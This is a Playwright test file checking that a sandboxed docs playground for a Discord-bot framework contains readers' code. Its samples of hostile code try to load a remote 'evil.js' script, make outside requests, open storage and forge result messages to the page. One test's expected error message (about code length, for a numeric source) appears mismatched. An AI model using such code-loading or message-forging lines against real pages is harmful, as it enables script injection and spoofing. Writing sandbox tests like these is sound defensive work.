import { readFileSync } from 'node:fs'
import { expect, test, type Page } from '@playwright/test'

// The frames the build wrote, as the site embeds them
const manifest = JSON.parse(readFileSync('.playground/manifest.json', 'utf8')) as {
  lines: { line: string; frame: string }[]
}
const frame = manifest.lines.find(each => each.line === '4.1')!.frame

type Message = { type: string; id?: number } & Record<string, unknown>

/**
 * Embeds the 4.1 frame in a docs page as the site will, sandboxed, and records every message it posts.
 * Returns the paths of the requests the page and the frame's Worker made under /playground/.
 */
async function embed(page: Page): Promise<string[]> {
  const loaded: string[] = []
  await page.context().route('**/playground/**', route => {
    loaded.push(new URL(route.request().url()).pathname)
    return route.continue()
  })
  await page.goto('/docs/4.1/guards')
  await page.evaluate(async frame => {
    const iframe = document.createElement('iframe')
    iframe.setAttribute('sandbox', 'allow-scripts')
    iframe.src = frame
    const messages: Message[] = []
    const ready = new Promise<void>(resolve =>
      addEventListener('message', event => {
        if (event.source !== iframe.contentWindow) return
        messages.push(event.data as Message)
        if ((event.data as Message).type === 'ready') resolve()
      }),
    )
    Object.assign(window, { __frame: iframe, __messages: messages })
    document.body.append(iframe)
    await ready
  }, frame)
  return loaded
}

/** Posts to the frame as the page does: its origin is opaque, so to any origin. */
const post = (page: Page, ...requests: Record<string, unknown>[]) =>
  page.evaluate(requests => {
    const target = (window as unknown as { __frame: HTMLIFrameElement }).__frame.contentWindow!
    for (const request of requests) target.postMessage(request, '*')
  }, requests)

/** The result the frame posted for the run `id`, once it has. */
const resultOf = (page: Page, id: unknown, timeout = 20_000) =>
  page
    .waitForFunction(
      id =>
        (window as unknown as { __messages: Message[] }).__messages.find(
          each => each.type === 'result' && each.id === id,
        ),
      id,
      { timeout },
    )
    .then(handle => handle.jsonValue() as Promise<Message>)

/** Posts a request to the frame and waits for its result. */
async function send(page: Page, request: Record<string, unknown>): Promise<Message> {
  await post(page, request)
  return resultOf(page, request.id)
}

const received = (page: Page) => page.evaluate(() => (window as unknown as { __messages: Message[] }).__messages)

let next = 1
const runOf = (source: string, dispatch: unknown[]) => ({ type: 'run', id: next++, source, dispatch })

const COUNTER = `
import { type ButtonInteraction } from 'discord.js'
import { respond } from 'meocord/common'
import { Command, Controller } from 'meocord/decorator'
import { CommandType } from 'meocord/enum'
@Controller()
export class Counter {
  @Command('counter/{count}', CommandType.BUTTON)
  async add(interaction: ButtonInteraction, { count }: { count: string }) {
    await respond(interaction).send({ content: 'Count: ' + (Number(count) + 1) })
  }
}
`

test("runs a reader's code in the sandboxed frame, fetching only the playground's files", async ({ page }) => {
  const loaded = await embed(page)
  const result = await send(page, runOf(COUNTER, [{ kind: 'button', customId: 'counter/4' }]))
  expect(result).toMatchObject({ ok: true, steps: [{ ran: true, handlers: ['Counter.add'] }] })
  expect((result.steps as { calls: unknown[] }[])[0].calls[0]).toMatchObject({ payload: { content: 'Count: 5' } })
  expect(loaded.every(path => path.startsWith('/playground/'))).toBe(true)
  expect(loaded.map(path => path.split('.').pop()).sort()).toEqual(['html', 'js', 'js', 'wasm'])
})

test('serves the frame sandboxed, under a policy that names the site', async ({ page, baseURL }) => {
  const response = await page.request.get(frame)
  const { origin } = new URL(baseURL!)
  const policy = response.headers()['content-security-policy']
  expect(policy).toContain('sandbox allow-scripts')
  expect(policy).toContain(`script-src ${origin}/playground/ 'unsafe-eval'`)
  expect(policy).toContain(`frame-ancestors ${origin};`)
  expect(response.headers()['cache-control']).toBe('public, max-age=31536000, immutable')
})

test("refuses what the reader's code posts in place of a result, and answers the run itself", async ({ page }) => {
  await embed(page)
  const request = runOf(
    `
import { type ButtonInteraction } from 'discord.js'
import { respond } from 'meocord/common'
import { Command, Controller } from 'meocord/decorator'
import { CommandType } from 'meocord/enum'
const post = (globalThis as any).postMessage
@Controller()
export class Forger {
  @Command('forge', CommandType.BUTTON)
  async forge(interaction: ButtonInteraction) {
    post({ type: 'navigate', url: 'https://example.com' })
    post({ type: 'result', id: ID, ok: true, steps: 'forged', logs: [] })
    post({ type: 'result', id: ID, ok: false, stage: 'network', message: 'forged', logs: [] })
    post({ type: 'result', id: ID + 1, ok: false, stage: 'load', message: 'forged', logs: [] })
    post({ type: 'started', id: ID })
    await respond(interaction).send({ content: 'genuine' })
  }
}
`.replaceAll('ID', String(next)),
    [{ kind: 'button', customId: 'forge' }],
  )
  const result = await send(page, request)
  expect(result).toMatchObject({ ok: true, steps: [{ handlers: ['Forger.forge'] }] })
  expect((result.steps as { calls: unknown[] }[])[0].calls[0]).toMatchObject({ payload: { content: 'genuine' } })
  // Give a late forgery time to arrive, then check nothing but the genuine answer reached the page
  await page.waitForTimeout(500)
  const messages = await received(page)
  expect(messages.map(each => `${each.type}:${each.id ?? ''}`)).toEqual(['ready:', `result:${request.id}`])
  expect(JSON.stringify(messages)).not.toContain('forged')
})

test("refuses the reader's code any script or request outside the playground's files", async ({ page, baseURL }) => {
  const outside: string[] = []
  await page.context().route('https://example.com/**', route => {
    outside.push(route.request().url())
    return route.abort()
  })
  await embed(page)
  const result = await send(
    page,
    runOf(
      `
import { type ButtonInteraction } from 'discord.js'
import { respond } from 'meocord/common'
import { Command, Controller } from 'meocord/decorator'
import { CommandType } from 'meocord/enum'
const scope = globalThis as any
async function attempt(what: string, act: () => unknown) {
  try {
    await act()
    return what + ': allowed'
  } catch {
    return what + ': refused'
  }
}
@Controller()
export class Reacher {
  @Command('reach', CommandType.BUTTON)
  async reach(interaction: ButtonInteraction) {
    const outcomes = [
      await attempt('script elsewhere', () => scope.importScripts('https://example.com/evil.js')),
      await attempt('site script', () => scope.importScripts('SITE/_next/static/chunks/x.js')),
      await attempt('request elsewhere', () => fetch('https://example.com/data')),
      await attempt('site request', () => fetch('SITE/api/health')),
      await attempt('blob script', () => scope.importScripts(URL.createObjectURL(new Blob(['1'], { type: 'text/javascript' })))),
      await attempt('storage', () => new Promise((resolve, reject) => {
        const opening = scope.indexedDB.open('x')
        opening.onsuccess = resolve
        opening.onerror = reject
      })),
    ]
    await respond(interaction).send({ content: outcomes.join('; ') })
  }
}
`.replaceAll('SITE', new URL(baseURL!).origin),
      [{ kind: 'button', customId: 'reach' }],
    ),
  )
  expect(result).toMatchObject({ ok: true })
  const content = (result.steps as { calls: { payload: { content: string } }[] }[])[0].calls[0].payload.content
  expect(content.split('; ')).toEqual([
    'script elsewhere: refused',
    'site script: refused',
    'request elsewhere: refused',
    'site request: refused',
    'blob script: refused',
    'storage: refused',
  ])
  expect(outside).toEqual([])
})

test('stops a run past its time limit, and runs the next in a new Worker', async ({ page }) => {
  await embed(page)
  const spin = runOf(
    `
import { Command, Controller } from 'meocord/decorator'
import { CommandType } from 'meocord/enum'
@Controller()
export class Spin {
  @Command('spin', CommandType.BUTTON)
  spin() {
    for (;;) {}
  }
}
`,
    [{ kind: 'button', customId: 'spin' }],
  )
  const started = Date.now()
  expect(await send(page, spin)).toMatchObject({
    ok: false,
    stage: 'timeout',
    message: 'The code ran for more than 5 seconds, so the playground stopped it.',
  })
  expect(Date.now() - started).toBeGreaterThanOrEqual(5_000)
  const after = await send(page, runOf(COUNTER, [{ kind: 'button', customId: 'counter/1' }]))
  expect(after).toMatchObject({ ok: true, steps: [{ ran: true }] })
})

test('stops the Worker once a run is answered, even by a result its code forged', async ({ page }) => {
  await embed(page)
  // The code answers its own run, then spins: the answer ends the run, and its Worker with it
  const forged = runOf(
    `
const scope = globalThis as any
scope.postMessage({ type: 'result', id: ID, ok: true, steps: [], logs: [] })
for (;;) {}
`.replaceAll('ID', String(next)),
    [],
  )
  expect(await send(page, forged)).toMatchObject({ ok: true, steps: [] })
  const started = Date.now()
  const after = await send(page, runOf(COUNTER, [{ kind: 'button', customId: 'counter/2' }]))
  expect(after).toMatchObject({ ok: true, steps: [{ ran: true, handlers: ['Counter.add'] }] })
  expect(Date.now() - started).toBeLessThan(5_000)
})

test('gives each run a fresh Worker, with nothing left of the run before', async ({ page }) => {
  await embed(page)
  // A global, and a timer that would forge the next run's result, both left behind by this run
  const first = runOf(
    `
const scope = globalThis as any
scope.leftover = 'from the run before'
setInterval(() => scope.postMessage({ type: 'result', id: NEXT, ok: true, steps: [], logs: [] }), 10)
export {}
`.replaceAll('NEXT', String(next + 1)),
    [],
  )
  expect(await send(page, first)).toMatchObject({ ok: true })
  const second = runOf(
    `
import { type ButtonInteraction } from 'discord.js'
import { respond } from 'meocord/common'
import { Command, Controller } from 'meocord/decorator'
import { CommandType } from 'meocord/enum'
@Controller()
export class Looker {
  @Command('look', CommandType.BUTTON)
  async look(interaction: ButtonInteraction) {
    await new Promise(resolve => setTimeout(resolve, 200))
    await respond(interaction).send({ content: String((globalThis as any).leftover) })
  }
}
`,
    [{ kind: 'button', customId: 'look' }],
  )
  const result = await send(page, second)
  expect(result).toMatchObject({ ok: true, steps: [{ ran: true, handlers: ['Looker.look'] }] })
  expect((result.steps as { calls: unknown[] }[])[0].calls[0]).toMatchObject({ payload: { content: 'undefined' } })
})

test('answers a malformed request, and one sent while a run is in progress, with why', async ({ page }) => {
  await embed(page)
  expect(await send(page, { type: 'run', id: next++, source: 1, dispatch: [] })).toMatchObject({
    ok: false,
    stage: 'request',
    message: 'the code is over 64,000 characters, the most a run takes',
  })
  const first = runOf(COUNTER, [{ kind: 'button', customId: 'counter/1' }])
  const second = runOf(COUNTER, [{ kind: 'button', customId: 'counter/2' }])
  await post(page, first, second)
  expect(await resultOf(page, second.id)).toMatchObject({
    ok: false,
    stage: 'request',
    message: 'A run is already in progress; wait for its result.',
  })
  expect(await resultOf(page, first.id)).toMatchObject({ ok: true })
})
